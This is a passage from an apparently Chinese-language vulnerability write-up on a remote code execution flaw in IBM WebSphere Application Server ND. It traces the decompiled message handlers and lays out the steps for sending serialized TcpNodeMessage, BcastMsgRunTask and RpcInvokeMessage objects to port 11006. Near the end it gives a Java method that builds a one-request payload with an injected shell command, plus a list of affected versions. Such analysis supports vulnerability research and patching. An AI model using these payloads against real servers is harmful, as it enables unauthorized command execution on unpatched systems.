                                }
                            }
                        } else {
                            var3 = false;
                            if (this.peer.isDebugEnabled()) {
                                this.peer.fine("Reject: we are NOT a structured gateway and the neighbor request is from a remote cell: neighbors (" + this.neighbors.size() + ")");
                            }
                        }
                    } else {
                        var3 = true;
                        if (this.peer.isDebugEnabled()) {
                            this.peer.fine("Accept: no excessive neighbors (" + this.neighbors.size() + ")");
                        }
                    }
                } else {
                    int var9 = SonInetAddress.compareIP(this.peer.thisNode.ip, var4.ip);
                    if (var9  在发送第一个消息TcpNodeMessage对象之后短时间内会接收到一个消息为Message对象（Type值为66）
如下图所示，接收到Message对象  
**如何处理Message (Type 66)：**  
这里可以看到Type66取出的处理器是"com.ibm.son.mesh.ProcTestTcpPing"  
跟进：  
这里直接是返回一个Message对象Type为67
那么返回的值不为Null, 则会广播这个消息出去：  
### Message (Type 67)消息处理：
当Message(Type 66)处理完之后马上会收到Message(Type 67)的消息，如下图所示：  
**跟进如下：**  
这里是之前TcpNodeMessage调用MemberMgr处理器设定的nextMsgProcessor属性：  
**继续跟进：**
    public Message procMessage(TCP var1, Message var2) {
        //限定类型，只允许Type为67的Message进入
            if (var2.type != 67) {
                return null;
            } else {
                if (this.peer.isDebugEnabled()) {
                    this.peer.fine("Received TEST_TCP_PONG from " + var1);
                }
                var2.markProcessed();
                Node var3 = this.peer.memberMgr.members.find(this.newNodeToConfirm);
                Message var4 = null;
            //如果Tcp处于连接状态
                if (this.nbrTcp.isConnected()) {
                    if (this.peer.isDebugEnabled()) {
                        this.peer.fine("ConfirmNewNbr: New neighbor " + this.newNodeToConfirm + " has been confirmed, and still exists. Accept it as new neighbor.");
                    }
            //设置Neighbor
                    Neighbor var5 = new Neighbor(this.peer, var3 == null ? this.newNodeToConfirm : var3, this.nbrTcp);
                    Message var6 = new Message(13);
                    var4 = this.peer.memberMgr.addNeighbor(var5, var6);
                }
                if (var3 == null) {
                    if (this.peer.isDebugEnabled()) {
                        this.peer.fine("ConfirmNewNbr: New neighbor " + this.newNodeToConfirm + " has been confirmed, and is not a member. Add it locally and globaly.");
                    }
                    this.peer.memberMgr.addNode(this.newNodeToConfirm);
                    this.peer.memberMgr.sendToAllNeighbors(new NodeBroadcastMessage(80001, this.newNodeToConfirm, this.peer, this.newNodeAnnounceMsg), this.newNodeToConfirm);
                } else if (this.peer.isDebugEnabled()) {
                    this.peer.fine("ConfirmNewNbr: the confirmed new neighbor " + this.newNodeToConfirm + " is already a member. Ignore.");
                }
                if (var4 != null) {
                    try {
                        this.nbrTcp.send(var4);
                    } catch (IOException var7) {
                        this.nbrTcp.handleIOException(var7);
                    }
                }
                if (this.peer.isDebugEnabled()) {
                    this.peer.fine("ConfirmNewNbr: Close test tcp " + var1);
                }
                var1.removeTcpCloseMonitor(this);
                var1.hardClose();
                return null;
            }
**上面的代码只需要关注两个地方：**  
1.判断Tcp是否处于连接状态
    if (this.nbrTcp.isConnected())
2.设置Neighbor
    Neighbor var5 = new Neighbor(this.peer, var3 == null ? this.newNodeToConfirm : var3, this.nbrTcp);
Neighbor的构造器如下:  
### BcastMsgRunTask.class Payload构造：
> 上面第一个TcpNodeMessage的Payload已经分析的差不多了  
>  至于为什么需要第1个Payload，是为了第2个Payload做的铺垫  
>  因为第2个Payload要想实现RCE必须让Neighbor属性不为Null
>
> 溯源BcastMsgRunTask的父类可以发现也是Message类
**Payload生成对象如下：**  
这里的Message Type为41
### BcastMsgRunTask Payload解析过程：
> 这里省略数据解析的过程，只看Process如何处理
迭代出来的第1个处理器"com.ibm.son.mesh.TCPBroadcastFilter"  
可以看到首先判断了对象类型，这里BcastMsgRunTask的父类就是"BcastFloodMsg"，所以可以跟进：
    public Message procMessage(TCP var1, Message var2) {
        //判断消息类型是否是“BcastFloodMsg”
            if (!(var2 instanceof BcastFloodMsg)) {
                return null;
            } else {
                BcastFloodMsg var3 = (BcastFloodMsg)var2;
                this.tmpMsgRecved.setMsg(var3.sourceIP, var3.sourceUdpPort, var3.sourceMsgID);
                TCPBroadcastFilter.MsgRecved var4;
            //判断接收的消息是否已经存在了一个临时的Key,这里进入了if
                if (!this.recvedMsgs.containsKey(this.tmpMsgRecved) && !this.recvedMsgs2.containsKey(this.tmpMsgRecved)) {
                    if (SonInetAddress.equalIP(var3.sourceIP, this.peer.thisNode.ip) && var3.sourceUdpPort == this.peer.thisNode.udpPort) {
                        this.peer.warning("A broadcast message is back to the sender: " + var2 + "   received from " + var1);
                        var2.markProcessed();
                        return null;
            //如果当前线程不是受管节点
                    } else if (!MemberMgr.isNodeInterestedInMsg(this.peer.thisNode, var2.getOriginatingCell())) {
                        this.peer.severe("starTop: Recieved boadcast message " + var2 + " however it originated in a cell we are not interested in: " + var2.getOriginatingCell());
                        var2.markProcessed();
                        return null;
            //进入到了这个else
                    } else {
                        var4 = new TCPBroadcastFilter.MsgRecved(this.tmpMsgRecved);
                        if (this.peer.isDebugEnabled()) {
                            this.peer.fine("Received new broadcast message " + var3 + " originated at: " + var4.toString());
                        }
                        this.recvedMsgs.put(var4, var4);
                        return null;
                    }
                } else {
                    if (this.peer.isDebugEnabled()) {
                        var4 = (TCPBroadcastFilter.MsgRecved)this.recvedMsgs.get(this.tmpMsgRecved);
                        if (var4 == null) {
                            var4 = (TCPBroadcastFilter.MsgRecved)this.recvedMsgs2.get(this.tmpMsgRecved);
                            if (var4 == null) {
                                this.peer.panic("Shouldn't be null");
                            }
                        }
                        if (this.peer.isDebugEnabled()) {
                            this.peer.fine("Duplicate broadcast message (type=" + var2.type + ") " + var4.toString() + " has been receive before.");
                        }
                    }
                    var2.markProcessed();
                    return null;
                }
            }
        }
这个处理器返回的是一个Null值，但是很重要，因为如果条件不符合会调用var2.markProcessed();，至Type为-1.
**继续跟进下一个处理器"TcpMsgTypeBasedDispatcher"**  
得到一个"RpcServerDispatcher.ProcRunTaskOnAllNodes"处理器：
### RpcServerDispatcher.ProcRunTaskOnAllNodes 消息处理器：
    public Message procMessage(TCP var1, Message var2) {
                if (RpcServerDispatcher.DEBUG && var2.type != 41) {
                    RpcServerDispatcher.this.peer.panic("Wrong message type: " + var2);
                }
                return RpcServerDispatcher.this.procRunTaskOnAllNodesTcp(var1, var2);
            }
**继续跟进"RpcServerDispatcher.this.procRunTaskOnAllNodesTcp(var1, var2)":**
    protected Message procRunTaskOnAllNodesTcp(TCP var1, Message var2) {
            if (DEBUG) {
                this.peer.fine("Received RUN_TASK_ON_ALL_NODES from " + var1);
            }
        //将此消息转发给Neighbors，这里会调用Neighbors的方法，所以这也是为什么上面要通过Payload1让Neighbors不为Null的原因，如果是Null这里就会抛空指针异常
            this.peer.forwardTcpBcast(var2, var1);
        //置消息Type为-1
            var2.markProcessed();
            BcastMsgRunTask var3 = (BcastMsgRunTask)var2;
            byte var4;
            Object var5;
            try {
            //调用Task.run()
                var5 = this.invoke(var3.task, var3.taskArgument, (TaskOutputConsumer)null);
                var4 = 2;
            } catch (Exception var7) {
                var5 = Util.getTraceString(var7);
                var4 = 1;
            }
            new RunTaskOnAllNodesTcpOutputCollector(this.peer, var1, var3, (Serializable)var5, var4);
            return null;
        }
**代码有几处重要的地方：**  
1.转发消息（通过第1步发送的Payload(TcpNodeMessage)）作用就是让这个不为Null
    this.peer.forwardTcpBcast(var2, var1);
2. **执行任务（可控对象，可控参数）**
    var5 = this.invoke(var3.task, var3.taskArgument, (TaskOutputConsumer)null);
### 执行任务：
> 继续跟进RpcServerDispatcher的invoke方法
    public Serializable invoke(String var1, Serializable var2, TaskOutputConsumer var3) throws Exception {
        //相当于一个Cache，加载过了就直接从容器里面拿
            Task var4 = (Task)this.rpcFuncInst.get(var1);
            if (var4 == null) {
                if (DEBUG) {
                    this.peer.fine("Create one instance for task " + var1 + " for the first time.");
                }
            //容器中找不到就Class.forName去加载。并且添加到容器内
                Class var5 = Class.forName(var1);
                var4 = (Task)var5.newInstance();
                this.rpcFuncInst.put(var1, var4);
                var4.init(this.peer);
            } else if (DEBUG) {
                this.peer.fine("An instance for task " + var1 + " already exists.");
            }
        //执行Task.run
            return var4.run(var2, var3);
        }
这里就触发了com.ibm.son.plugin.UploadFileToAllNodes的run方法：  
### POC
> java版poc, 计算器坏了弹个Mstsc.exe
### 流程：
  1. 与服务器建立TCP连接，端口号11006
  2. 把序列化的TcpNodeMessage消息对象发送到服务器反序列化，消息处理后会注册ip为0.0.0.0的节点，并把当前TCP连接一起传入广播消息(Message Type 66， Message Type 67)。最后使当前TCP连接注册neighbor
  3. 把序列化的BcastMsgRunTask消息对象发送到服务器反序列化，执行任务，类："com.ibm.son.plugin.UploadFileToAllNodes",参数可控造成远程RCE
### 基于此漏洞衍生出的另一种Payload
在前面已经说了利用此漏洞需要分两步  
1.发送TcpNodeMessage  
2.发送BcastMsgRunTask
**由于实际中可能碰到的复杂情况非常之多，且在第一步发送TcpNodeMessage之后需要sleep几秒钟，也就是说还和网络状况挂钩，所以不确定因素很大。在实战中肯定是需求的步骤越少越好，一次性利用。所以根据深入研究发现存在另一种与此相似的Payload只需请求一次即可触发RCE**
#### RpcServerDispatcher消息处理器
RpcServerDispatcher消息处理器相比RpcServerDispatcher.ProcRunTaskOnAllNodes消息处理器不需要neighbor不为Null,
只需要发送一个Payload即可完成利用：  
相关处理代码如下：
    public Message procMessage(final TCP var1, Message var2) {
            if (DEBUG && var2.type != 38) {
                this.peer.panic("Wrong message type: " + var2);
            }
            var2.markProcessed();
            try {
                RpcInvokeMessage var3 = (RpcInvokeMessage)var2;
                class RpcTaskOutputConsumer implements TaskOutputConsumer {
                    RpcTaskOutputConsumer() {
                    }
                    public void consumeTaskOutput(Serializable var1x) {
                        try {
                            var1.send(new RpcResponseMessage(39, new RpcResponse("OK", var1x)));
                        } catch (IOException var3) {
                            var1.handleIOException(var3);
                        }
                    }
                }
                RpcTaskOutputConsumer var4 = new RpcTaskOutputConsumer();
                Serializable var5 = this.invoke(var3.func, var3.argument, var4);
                return var5 == var4.getClass() ? null : new RpcResponseMessage(39, new RpcResponse("OK", var5));
            } catch (Exception var6) {
                this.peer.warning(Util.getTraceString(var6));
                return new RpcResponseMessage(39, new RpcResponse(Util.getTraceString(var6), (Serializable)null));
            }
        }
可以看上述代码，传入的Message对象是一个"RpcInvokeMessage", 然后直接拿出里面的属性传入invoke方法。  
和之前分析文章的触发点一样，但这个没有neighbor的限制
#### 构建RpcInvokeMessage对象:
    public byte[] getRpcInvokeMessageObj(String op, String command) throws Exception {
            UploadFileArgument arg = new UploadFileArgument(".0osf1.tmp", new byte[]{0}, String.format("%s %s && ",op ,command));
            Object obj =  new RpcInvokeMessage(38, "com.ibm.son.plugin.UploadFileToAllNodes", arg);
            return Serializer.serialize(obj);
        }
**和原先的差不多，只是把BcastMsgRunTask换成了RpcInvokeMessage，且消息类型为38**  
**在建立TCP连接之后直接发送这个Payload即可完成利用**
### 影响版本：
> WebSphere Application Server ND 9.0  
>  WebSphere Application Server ND 8.5  
>  WebSphere Virtual Enterprise V7.0
### 参考
  * 